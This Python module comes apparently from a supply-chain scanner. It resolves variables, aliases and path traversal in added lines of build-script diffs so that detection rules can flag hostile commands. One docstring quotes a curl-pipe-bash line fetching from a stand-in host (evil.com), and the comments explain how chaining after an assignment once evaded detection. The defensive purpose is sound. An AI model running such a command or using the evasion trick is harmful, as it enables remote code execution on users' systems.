"""Extracted from _tokenizer_engine.py: _apply."""

import re
from ._aliases import _alias_table, _expand_aliases
from ._common import _ASSIGNMENT_RE, _VAR_REF_RE, _memoised, _split_top_level, _tail_continues
from ._quotes import split_lines
from ._variables import _assignments_are_shell, _substitute_with_resolve, _variable_table, join_line_continuations

__all__ = ['_TRAVERSAL_RE', '_joined_indexed', '_resolve_added_lines', 'collapse_traversal', 'resolve_added_lines', 'strip_leading_bom', 'tokenize_and_resolve', 'tokenize_and_resolve_indexed']

_TRAVERSAL_RE = re.compile(r"/(?!\.\./)[^/\s;&|\"']+/\.\.(?=/|$)")

def strip_leading_bom(line: str) -> str:
    """Remove a BOM that opens *line*, keeping any that sits inside it."""
    if line[:1] in ("+", "-", " "):
        marker, body = line[0], line[1:]
        return marker + body.lstrip("\ufeff") if body[:1] == "\ufeff" else line
    return line.lstrip("\ufeff") if line[:1] == "\ufeff" else line

def collapse_traversal(text: str) -> str:
    """Collapse `a/b/../c` to `a/c` in path-shaped tokens."""
    for _ in range(8):
        collapsed = _TRAVERSAL_RE.sub("", text)
        if collapsed == text:
            break
        text = collapsed
    return text

def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    return _memoised("resolved", diff_text, lambda: _resolve_added_lines(diff_text))

def _resolve_added_lines(diff_text: str) -> list[str]:
    lines = join_line_continuations(split_lines(diff_text))
    additions = [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
    var_table, array_table = _variable_table(additions)
    alias_table = _alias_table(additions)
    resolved_lines = []
    for line in lines:
        if line.startswith("+"):
            r, _ok = _substitute_with_resolve(line[1:], var_table, array_table)
            r = collapse_traversal(_expand_aliases(r, alias_table))
            resolved_lines.append("+" + r)
        else:
            resolved_lines.append(line)
    return resolved_lines

def _joined_indexed(lines: list[str]) -> list[tuple[int, str]]:
    """Like :func:`join_line_continuations`, but each logical line is
    paired with the index of the first raw line that produced it.

    ``apply_rules`` needs that index to attach a file/line: the resolved
    candidate list omits assignment lines, so its own positions are not
    the keys of :func:`~trustsight.differ.map_diff_lines`, which are raw
    diff-line indexes.
    """
    out: list[tuple[int, str]] = []
    parts: list[str] | None = None
    marker = ""
    start_index = -1

    def flush() -> str:
        return "".join(parts)

    for i, line in enumerate(lines):
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            # Verbatim, exactly as `join_line_continuations` does: a
            # backslash-newline is removed by the shell rather than being
            # whitespace. These two joiners must agree, or the rule path and
            # the coverage path read different text from the same diff.
            parts.append(body)
        else:
            if parts is not None:
                out.append((start_index, marker + flush()))
            parts, marker, start_index = [body], this_marker, i
        tail = parts[-1]
        stripped_tail = tail.rstrip()
        if stripped_tail.endswith("\\"):
            parts[-1] = stripped_tail[:-1].rstrip()
        elif _tail_continues(stripped_tail):
            pass  # still accumulating: an operator promises more input
        else:
            out.append((start_index, marker + flush()))
            parts, marker, start_index = None, "", -1
    if parts is not None:
        out.append((start_index, marker + flush()))
    return out

def tokenize_and_resolve_indexed(
    diff_text: str,
) -> tuple[list[str], list[str], list[int]]:
    """Tokenize a diff, resolve variable references in added lines, and
    record the raw diff-line index of each resolved string.

    The third list parallels ``resolved``: ``resolved[i]`` came from the
    line at ``split_lines(diff_text)[indices[i]]``.  ``map_diff_lines`` is
    keyed on those raw indexes, so a caller can attach a correct
    file/line to every resolved-rule finding.
    """
    joined = _joined_indexed(split_lines(diff_text))
    additions = []
    addition_indices = []
    for raw_index, line in joined:
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)
                addition_indices.append(raw_index)

    var_table, array_table = _variable_table(additions)
    # This is a second resolver, parallel to `_resolve_added_lines`, and it
    # is what feeds every `match_target = "resolved"` rule - R001 among them.
    # Alias expansion added in only one of the two would be the same defect
    # the aliases themselves exploit: a spelling that one path understands
    # and the other does not.
    alias_table = _alias_table(additions)

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    shell_at = _assignments_are_shell(split_lines(diff_text))

    def _folds_away(line: str) -> bool:
        """True when *line* is nothing but an assignment declaration.

        ``U=evil.com/stage.sh; curl $U | bash`` matches the assignment
        shape, but only up to the first separator: the rest is a second
        command.  Folding such a line hides it from every resolved-target
        rule - R001 included - which is how a curl-pipe-bash chained after
        an assignment went unflagged while the raw-line rules saw only
        their narrow scopes.
        """
        m = _ASSIGNMENT_RE.match(line)
        if not m or "$(" in m.group(3) or "`" in m.group(3):
            return False
        return len(_split_top_level(line)) <= 1

    candidates = [
        (addition_indices[k], line)
        for k, line in enumerate(additions)
        if not (shell_at[addition_indices[k]] and _folds_away(line))
    ]

    resolved = []
    unresolved_out = []
    for _raw_index, line in candidates:
        r, ok = _substitute_with_resolve(line, var_table, array_table)
        expanded = collapse_traversal(_expand_aliases(r, alias_table))
        resolved.append(expanded)
        # "Could not fully resolve" (report-schema.md), not "was literal":
        # a plain `+echo hello` expands to itself and is not unresolved.
        # What belongs here is a failed ${...} expansion (not ok) or a
        # reference that survived substitution ($var nobody declared).
        if not ok or _VAR_REF_RE.search(expanded):
            unresolved_out.append(line)
    candidate_indices = [raw_index for raw_index, _line in candidates]
    return resolved, unresolved_out, candidate_indices

def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    """Tokenize a diff and resolve variable references in added lines."""
    resolved, unresolved_out, _ = tokenize_and_resolve_indexed(diff_text)
    return resolved, unresolved_out
